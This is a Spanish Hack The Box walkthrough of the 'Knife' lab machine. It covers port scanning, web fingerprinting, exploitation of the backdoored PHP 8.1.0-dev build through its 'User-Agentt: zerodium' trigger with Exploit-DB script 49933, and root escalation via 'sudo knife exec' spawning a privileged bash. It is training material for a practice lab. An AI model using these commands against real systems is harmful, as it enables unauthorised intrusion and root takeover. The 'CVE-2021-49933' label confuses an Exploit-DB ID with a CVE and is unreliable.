# 🗡️ Knife

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 10.129.14.68
> **💀 Dificultad:** Fácil
> **🌐 Plataforma:** Hack The Box

---

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración, lanzamos un ping para verificar conectividad con la máquina objetivo y aprovechar el valor del **TTL** para intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```bash
> ping -c 1 10.129.14.68
> ```
>
> `-c 1` — Envía **un único paquete ICMP** y termina.

![](assets/Knife-img-09-03-2026.png)

El TTL obtenido es **63**, lo que confirma que estamos ante una máquina **Linux**. Confirmada la conectividad, procedemos con la enumeración de puertos.

---

### 👁️ Enumeración con Nmap

#### Descubrimiento de puertos abiertos

Comenzamos identificando qué puertos se encuentran abiertos mediante un SYN Scan sobre el rango completo de puertos. Este tipo de escaneo es rápido y sigiloso, ya que no completa el three-way handshake TCP.

> [!tip] Escaneo SYN sobre los 65535 puertos
> ```bash
> nmap -sS -p- --open --min-rate 5000 -n -Pn -vvv 10.129.14.68 -oN ports
> ```
>
> `-sS` — **SYN Scan** (half-open): envía SYN, recibe SYN/ACK y envía RST sin completar la conexión. Requiere root.
> `-p-` — Escanea los **65535 puertos** posibles.
> `--open` — Muestra **únicamente puertos abiertos**, filtrando cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo** para acelerar el escaneo.
> `-n` — Deshabilita la resolución DNS, evitando latencia adicional.
> `-Pn` — Omite el ping previo y asume el host como activo.
> `-vvv` — **Triple verbose**: muestra resultados en tiempo real conforme se descubren.
> `-oN ports` — Guarda el output en formato legible en el archivo `ports`.

![](assets/Knife-img-09-03-2026-1.png)

Puertos abiertos identificados: **22 (SSH)** y **80 (HTTP)**.

---

#### Detección de versiones y servicios

Con los puertos identificados, lanzamos un escaneo más profundo para determinar las versiones exactas de los servicios y obtener información adicional mediante los scripts NSE por defecto.

> [!tip] Enumeración de servicios y versiones sobre puertos seleccionados
> ```bash
> nmap -sC -sV -p22,80 --min-rate 5000 -n -Pn -vvv 10.129.14.68 -oN version
> ```
>
> `-sC` — Ejecuta los **scripts NSE por defecto**: banner grabbing, detección de configuraciones, etc.
> `-sV` — **Detección de versiones** de los servicios en cada puerto.
> `-p22,80` — Apunta exclusivamente a los **puertos descubiertos** en el paso anterior.
> `--min-rate 5000` — Mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo.
> `-vvv` — Triple verbose.
> `-oN version` — Guarda el output en el archivo `version`.

![](assets/Knife-img-09-03-2026-2.png)

El dato más relevante de esta fase es la versión de PHP detectada en el servidor web: **PHP/8.1.0-dev**.

---

#### Detección de vulnerabilidades con scripts NSE

Con los servicios identificados, ejecutamos los scripts de la categoría `vuln` de nmap para comprobar automáticamente la presencia de vulnerabilidades conocidas.

> [!tip] Escaneo de vulnerabilidades con scripts NSE vuln
> ```bash
> nmap --script vuln -p22,80 10.129.14.68 -vvv -oN vuln
> ```
>
> `--script vuln` — Lanza todos los scripts de la categoría **vuln**, que comprueban vulnerabilidades conocidas en los servicios detectados.
> `-p22,80` — Apunta a los **puertos ya identificados**.
> `-vvv` — Triple verbose.
> `-oN vuln` — Guarda el output en el archivo `vuln`.

![](assets/Knife-img-09-03-2026-3.png)

---

### 🌐 Enumeración Web

#### Whatweb — Fingerprinting de la aplicación

Antes de interactuar manualmente con el sitio, usamos `whatweb` para obtener un fingerprint rápido de las tecnologías presentes: servidor web, CMS, versiones de frameworks y cabeceras HTTP relevantes.

> [!tip] Fingerprinting de tecnologías web con WhatWeb
> ```bash
> whatweb http://10.129.14.68
> ```

![](assets/Knife-img-09-03-2026-5.png)

WhatWeb confirma la presencia de **PHP/8.1.0-dev**, dato que será clave en la fase de explotación.

---

#### Gobuster — Fuzzing de directorios y archivos

Con el servidor web activo en el puerto 80, realizamos un fuzzing de directorios para mapear la estructura del sitio y descubrir rutas no enlazadas que puedan ampliar la superficie de ataque.

> [!tip] Fuzzing de directorios y extensiones con Gobuster
> ```bash
> gobuster dir -u http://10.129.14.68 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --no-error -x php,txt -o fuzz.txt
> ```
>
> `dir` — Modo de **enumeración de directorios y archivos**.
> `-u http://10.129.14.68` — URL objetivo del fuzzing.
> `-w .../directory-list-2.3-medium.txt` — Wordlist de tamaño medio de SecLists con rutas comunes.
> `--no-error` — Suprime mensajes de error en pantalla, manteniendo el output limpio.
> `-x php,txt` — Prueba las extensiones `.php` y `.txt` sobre cada entrada del wordlist, ampliando la cobertura.
> `-o fuzz.txt` — Guarda los resultados en el archivo `fuzz.txt`.

![](assets/Knife-img-09-03-2026-4.png)

---

## 💥 Explotación — CVE-2021-49933 (PHP 8.1.0-dev RCE)

La versión **PHP/8.1.0-dev** identificada corresponde a una build de desarrollo backdoored que fue comprometida en el repositorio oficial de PHP en marzo de 2021. Un atacante introdujo en el código fuente una función maliciosa que permite **Remote Code Execution (RCE) sin autenticación** mediante la cabecera HTTP `User-Agentt`.

> [!info] **PHP 8.1.0-dev — Backdoor RCE (Exploit-DB #49933)**
> Build de desarrollo de PHP publicada brevemente en el repositorio oficial con un backdoor introducido por un atacante que comprometió el servidor de Git de PHP. El backdoor evalúa como código PHP el contenido de la cabecera HTTP `User-Agentt` (con doble `t`) si comienza por la cadena `zerodium`. Permite ejecución de código arbitrario como el usuario que corre el servidor web, sin necesidad de autenticación ni credenciales. Afecta exclusivamente a los binarios PHP compilados a partir del código fuente comprometido en ese período.

Localizamos el exploit con `searchsploit`:

> [!tip] Buscar el exploit de PHP 8.1.0-dev con Searchsploit
> ```bash
> searchsploit php 8.1.0-dev
> ```

![](assets/Knife-img-09-03-2026-6.png)

Descargamos el exploit localmente y lo renombramos para mayor comodidad:

> [!tip] Descargar el exploit y prepararlo para su ejecución
> ```bash
> searchsploit -m php/webapps/49933.py
> mv 49933.py exploit.py
> python3 exploit.py
> ```
>
> `-m php/webapps/49933.py` — **Mirror**: copia el exploit al directorio de trabajo actual.
> `mv 49933.py exploit.py` — Renombra el archivo para simplificar su uso.

Al ejecutarlo nos solicita la URL objetivo. Tras introducirla, el exploit establece una shell interactiva como el usuario **james**:

![](assets/Knife-img-09-03-2026-7.png)

> [!important] La shell obtenida no es una TTY completa. Para estabilizarla y tener una experiencia interactiva completa, realizar el tratamiento estándar: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, `Ctrl+Z`, `stty raw -echo; fg`, `reset`, `export TERM=xterm`.

---

## 🔼 Escalada de Privilegios — Sudo knife exec

Con acceso como **james**, ejecutamos `sudo -l` para comprobar qué comandos puede ejecutar con privilegios elevados sin necesidad de contraseña:

> [!tip] Comprobar permisos sudo del usuario actual
> ```bash
> sudo -l
> ```

![](assets/Knife-img-09-03-2026-11.png)

La salida revela que james puede ejecutar `/usr/bin/knife` como root sin contraseña (`NOPASSWD`).

> [!info] **knife**
> Herramienta de línea de comandos del framework de gestión de configuración **Chef**. Permite interactuar con el servidor Chef, gestionar nodos, roles, cookbooks y ejecutar código Ruby arbitrario mediante el subcomando `exec`. Al poder ejecutarse con `sudo` sin contraseña, proporciona un vector directo de escalada de privilegios: cualquier código Ruby pasado a `knife exec` se ejecutará en el contexto de root. Documentado en [GTFOBins](https://gtfobins.github.io/gtfobins/knife/).

Comprobamos la ayuda del binario para confirmar el subcomando `exec`:

![](assets/Knife-img-09-03-2026-10.png)

Ejecutamos `knife exec` con `sudo` para obtener una shell como root:

> [!tip] Escalar privilegios a root mediante knife exec
> ```bash
> sudo knife exec -E 'exec "/bin/bash -p"'
> ```
>
> `sudo` — Ejecuta el comando con los privilegios de root (permitido sin contraseña para este binario).
> `knife exec` — Subcomando de knife que ejecuta código Ruby en el contexto del proceso.
> `-E 'exec "/bin/bash -p"'` — Código Ruby inline: llama a `exec` del sistema para reemplazar el proceso actual por una bash con la flag `-p` (privileged mode, no descarta EUID=0).

![](assets/Knife-img-09-03-2026-9.png)

---

## 📝 Lecciones Aprendidas

La máquina Knife ilustra un escenario de compromiso en dos fases limpias y encadenadas. La presencia de **PHP/8.1.0-dev** en producción — una build de desarrollo que jamás debería desplegarse en un entorno real — es el punto de entrada: un backdoor introducido en el repositorio oficial de PHP proporciona RCE sin autenticación. La escalada se apoya en un error de configuración común: conceder permisos `sudo NOPASSWD` sobre una herramienta de administración (`knife`) sin entender que su subcomando `exec` equivale funcionalmente a `sudo ruby` — y por tanto a ejecución arbitraria como root.

Los puntos clave del engagement son tres. Primero, la detección de versión de PHP mediante whatweb y los scripts NSE de nmap fue el dato pivote que dirigió toda la investigación hacia el CVE correcto. Segundo, `sudo -l` siempre debe ser el primer comando tras obtener acceso como usuario no privilegiado — en este caso resolvió la escalada de forma inmediata. Tercero, la consulta en GTFOBins de cualquier binario con permisos sudo es un paso sistemático no negociable: herramientas de administración legítimas como knife, facter (visto en la máquina Facts), o python aparecen con frecuencia en configuraciones inseguras de sudo en entornos reales.